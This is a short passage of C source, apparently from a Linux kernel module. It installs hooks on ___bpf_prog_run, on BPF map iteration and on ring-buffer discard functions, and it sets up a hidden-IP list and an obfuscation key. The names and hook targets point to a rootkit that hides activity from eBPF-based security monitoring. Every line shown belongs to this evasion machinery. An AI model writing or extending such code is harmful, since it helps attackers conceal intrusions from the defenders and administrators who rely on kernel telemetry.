    HOOK("___bpf_prog_run",           hook_bpf_prog_run_fn,           &orig_bpf_prog_run_fn),
};

notrace int bpf_hook_init(void)
{
    int ret, installed = 0, i;

    init_hidden_ip();
    atomic64_set(&ebpf_obf_key, 0);

    fn_map_next   = (t_map_next)  resolve_sym("bpf_map_get_curr_or_next");
    fn_map_put    = (t_map_put)   resolve_sym("bpf_map_put");
    fn_rb_discard        = (t_rb_discard)        resolve_sym("bpf_ringbuf_discard");
    fn_rb_discard_dynptr = (t_rb_discard_dynptr) resolve_sym("bpf_ringbuf_discard_dynptr");

    find_config_map_va();

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        ret = fh_install_hook(&hooks[i]);
        if (ret == 0) installed++;
    }

    if (installed == 0) return -ENOENT;
    return 0;
}

notrace void bpf_hook_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
